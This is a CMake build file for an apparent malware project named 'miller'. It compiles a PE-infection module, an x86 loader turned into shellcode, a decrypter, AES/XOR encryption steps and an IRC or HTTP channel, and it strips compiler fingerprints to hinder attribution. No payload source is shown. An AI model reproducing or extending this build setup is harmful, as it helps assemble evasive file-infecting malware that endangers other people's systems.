set(MILLER_SRC snprintf.c aes.c crypt.c crypt_strings.c compat.c file.c math.c pe_infect.c utils.c disasm.c patch.c main.c CACHE INTERNAL "" FORCE)
set(MILLER_HDR snprintf.h aes.h crypt.h crypt_strings.h compat.h file.h math.h pe_infect.h utils.h disasm.h patch.h CACHE INTERNAL "" FORCE)
if (ENABLE_IRC)
  set(MILLER_PRE_DEFS ${MILLER_PRE_DEFS} "_ENABLE_IRC=1" CACHE INTERNAL "" FORCE)
  set(MILLER_DEFS ${MILLER_DEFS} "_ENABLE_IRC=1" CACHE INTERNAL "" FORCE)
  set(MILLER_SRC ${MILLER_SRC} irc.c CACHE INTERNAL "" FORCE)
  set(MILLER_HDR ${MILLER_HDR} irc.h CACHE INTERNAL "" FORCE)
else()
  set(MILLER_SRC ${MILLER_SRC} http.c CACHE INTERNAL "" FORCE)
  set(MILLER_HDR ${MILLER_HDR} http.h CACHE INTERNAL "" FORCE)
endif()
if (HTTP_LOCALHOST)
  set(MILLER_PRE_DEFS ${MILLER_PRE_DEFS} "_HTTP_LOCALHOST=1" CACHE INTERNAL "" FORCE)
  set(MILLER_DEFS ${MILLER_DEFS} "_HTTP_LOCALHOST=1" CACHE INTERNAL "" FORCE)
endif()
if (INFECT_DUMMY)
  set(MILLER_PRE_DEFS ${MILLER_PRE_DEFS} "_INFECT_DUMMY=1" CACHE INTERNAL "" FORCE)
  set(MILLER_DEFS ${MILLER_DEFS} "_INFECT_DUMMY=1" CACHE INTERNAL "" FORCE)
endif()
if (EXTRA_VERBOSE)
  set(MILLER_PRE_DEFS ${MILLER_PRE_DEFS} "_EXTRA_VERBOSE=1" CACHE INTERNAL "" FORCE)
endif()

PrefixPath(MILLER_SRC source ${MILLER_SRC})
PrefixPath(MILLER_HDR include ${MILLER_HDR})

set(CRT_X86 crt_x86 CACHE INTERNAL "" FORCE)
set(CRT_X86_SRC ${CRT_X86}.asm; CACHE INTERNAL "" FORCE)
PrefixPath(CRT_X86_SRC source ${CRT_X86_SRC})

set(LOADER_X86_SRC ${LOADER_X86}.asm CACHE INTERNAL "" FORCE)
PrefixPath(LOADER_X86_SRC source ${LOADER_X86_SRC})

set(DECRYPTER_X86_SRC ${DECRYPTER_X86}.asm CACHE INTERNAL "" FORCE)
PrefixPath(DECRYPTER_X86_SRC source ${DECRYPTER_X86_SRC})

set(DISTORM_SRCDIR "source/distorm" CACHE INTERNAL "" FORCE)
set(DISTORM_PRE_DEFS CACHE INTERNAL "" FORCE)
set(DISTORM_DEFS ${DISTORM_PRE_DEFS} DISTORM_LIGHT=1 CACHE INTERNAL "" FORCE)
set(DISTORM_SRC decoder.c distorm.c instructions.c insts.c mnemonics.c operands.c prefix.c CACHE INTERNAL "" FORCE)
set(DISTORM_PRE_SRC ${DISTORM_SRC} wstring.c textdefs.c CACHE INTERNAL "" FORCE)
PrefixPath(DISTORM_SRC ${DISTORM_SRCDIR} ${DISTORM_SRC})
PrefixPath(DISTORM_PRE_SRC ${DISTORM_SRCDIR} ${DISTORM_PRE_SRC})

include_directories(AFTER ${MILLER_SRCDIR})
include_directories(AFTER ${MILLER_HDRDIR})
include_directories(AFTER ${DISTORM_SRCDIR})

# miller minimal CRTi
add_library(${CRT_X86} ${CRT_X86_SRC})
set_target_properties(${CRT_X86} PROPERTIES COMPILE_FLAGS "-O0")

# miller dll32 loader (final version, no debug, no pe32 support)
add_library(${LOADER_X86} ${LOADER_X86_SRC})
set_target_properties(${LOADER_X86} PROPERTIES COMPILE_FLAGS "-D_LDR_SECTION=${LOADER_SECTION} -D_LOADER_ENDMARKER=${LOADER_ENDMARKER} -O0")
# miller dll32 loader (debug, pe32 support)
add_library(${LOADER_X86}_debug ${LOADER_X86_SRC})
set_target_properties(${LOADER_X86}_debug PROPERTIES COMPILE_FLAGS "-D_DEBUG=1 -D_LDR_SECTION=${LOADER_SECTION} -D_LOADER_ENDMARKER=${LOADER_ENDMARKER} -O0")
# miller dll32 decrypter (debug, decrypter.exe)
add_library(${DECRYPTER_X86} ${DECRYPTER_X86_SRC})
set_target_properties(${DECRYPTER_X86} PROPERTIES COMPILE_FLAGS "-D_LDR_SECTION=${LOADER_SECTION} -D_LOADER_ENDMARKER=${LOADER_ENDMARKER} -O0")

# miller release build (DYNAMIC LINKED RELOCATEABLE)
add_library(${PROJECT_NAME}-shared SHARED ${MILLER_HDR} ${MILLER_SRC})
add_dependencies(${PROJECT_NAME}-shared ${CRT_X86} loader_gen hdrcrypt cryptout_aes cryptout_xor)
target_link_libraries(${PROJECT_NAME}-shared distorm ${CRT_X86})

# miller release (c|ld)flags
target_include_directories(${PROJECT_NAME}-shared PRIVATE ${MILLER_HDRDIR_CREATED})
target_compile_definitions(${PROJECT_NAME}-shared PRIVATE ${DISTORM_DEFS} ${MILLER_DEFS} ${LOADERBASE_DEFS})
set_target_properties(${PROJECT_NAME}-shared PROPERTIES COMPILE_FLAGS "${default_cflags} ${miller_cflags}")
set_target_properties(${PROJECT_NAME}-shared PROPERTIES LINK_FLAGS "${default_ldflags} -v -Wl,-Map,${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}-shared.map -Wl,--image-base,${MILLER_IMAGEBASE}")

# miller pre-release build
add_library(${PROJECT_NAME}_pre-shared SHARED ${MILLER_HDR} ${MILLER_SRC})
add_dependencies(${PROJECT_NAME}_pre-shared ${CRT_X86} loader_gen hdrcrypt cryptout_aes cryptout_xor)
target_link_libraries(${PROJECT_NAME}_pre-shared distorm_pre ${CRT_X86})

# miller pre-release (c|ld)flags
target_include_directories(${PROJECT_NAME}_pre-shared PRIVATE ${MILLER_HDRDIR_CREATED})
target_compile_definitions(${PROJECT_NAME}_pre-shared PRIVATE ${DISTORM_PRE_DEFS} ${MILLER_PRE_DEFS} ${LOADERBASE_DEFS})
set_target_properties(${PROJECT_NAME}_pre-shared PROPERTIES COMPILE_FLAGS "${default_cflags} ${miller_cflags}")
set_target_properties(${PROJECT_NAME}_pre-shared PROPERTIES LINK_FLAGS "${default_ldflags} -v -Wl,-Map,${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre-shared.map -Wl,--image-base,${MILLER_IMAGEBASE}")

# run some python scripts to remove binutils/gcc/mingw fingerprints
RemoveGCCFingerprintFromObj(${PROJECT_NAME}-shared ${MILLER_SRC})
RemoveFingerprints(${PROJECT_NAME}-shared)
RemoveGCCFingerprintFromObj(${PROJECT_NAME}_pre-shared ${MILLER_SRC})
RemoveFingerprints(${PROJECT_NAME}_pre-shared)

CreateBinary(${PROJECT_NAME}-shared ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}.bin)
CreateBinary(${PROJECT_NAME}_pre-shared ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin)
add_dependencies(${PROJECT_NAME}-shared_bin ${PROJECT_NAME}-shared_no-fingerprints)
add_dependencies(${PROJECT_NAME}_pre-shared_bin ${PROJECT_NAME}_pre-shared_no-fingerprints)

install(FILES ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}.bin ${CMAKE_RUNTIME_OUTPUT_DIRECTORY}/${PROJECT_NAME}_pre.bin DESTINATION ${INSTALL_DEST})

add_custom_command(TARGET ${PROJECT_NAME}-shared
  PRE_BUILD
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --red --bold "Creating symlink: ${CMAKE_RUNTIME_OUTPUT_DIRECTORY} to ${CMAKE_CURRENT_SOURCE_DIR}/bin"
  COMMAND test -e "${CMAKE_CURRENT_SOURCE_DIR}/bin" || ${CMAKE_COMMAND} -E create_symlink "${CMAKE_RUNTIME_OUTPUT_DIRECTORY}" "${CMAKE_CURRENT_SOURCE_DIR}/bin"
)

add_custom_command(OUTPUT ${LOADER_HEADER_STAMP} ${LOADER_HEADER}
  COMMAND ${CMAKE_COMMAND} -E cmake_echo_color --cyan --bold "genShellcode.py: ${LOADER_HEADER}"
  COMMAND ${PYTHON} ${CMAKE_SOURCE_DIR}/batch/genShellcode.py --section="${LOADER_SECTION}" --binary="$<TARGET_FILE:${LOADER_X86}>" --define-prefix="LOADER_SHELLCODE" --file="${LOADER_HEADER}"
  COMMAND ${PYTHON} ${CMAKE_SOURCE_DIR}/batch/genShellcode.py --section="${LOADER_SECTION}" --binary="$<TARGET_FILE:${LOADER_X86}_debug>" --define-prefix="LOADER_SHELLCODE_DEBUG" --file="${LOADER_HEADER}"
  COMMAND ${CMAKE_COMMAND} -E touch ${LOADER_HEADER_STAMP}
)
add_custom_target(loader_gen
  DEPENDS ${LOADER_X86} ${LOADER_X86}_debug ${LOADER_HEADER_STAMP} ${LOADER_HEADER}
)

add_library(distorm ${DISTORM_SRC})
set_target_properties(distorm PROPERTIES COMPILE_FLAGS "${default_cflags} ${miller_cflags}")
set_target_properties(distorm PROPERTIES LINK_FLAGS "${default_ldflags}")
target_compile_definitions(distorm PRIVATE ${DISTORM_DEFS})
# remove gcc fingerprint from distorm
RemoveGCCFingerprintFromObj(distorm ${DISTORM_SRC})

add_library(distorm_pre ${DISTORM_PRE_SRC})
set_target_properties(distorm_pre PROPERTIES COMPILE_FLAGS "${default_cflags} ${miller_cflags}")
set_target_properties(distorm_pre PROPERTIES LINK_FLAGS "${default_ldflags}")
target_compile_definitions(distorm_pre PRIVATE ${DISTORM_PRE_DEFS})
# remove gcc fingerprint from distorm_pre
RemoveGCCFingerprintFromObj(distorm_pre ${DISTORM_PRE_SRC})

install(TARGETS ${PROJECT_NAME}-shared ${PROJECT_NAME}_pre-shared RUNTIME DESTINATION ${INSTALL_DEST})
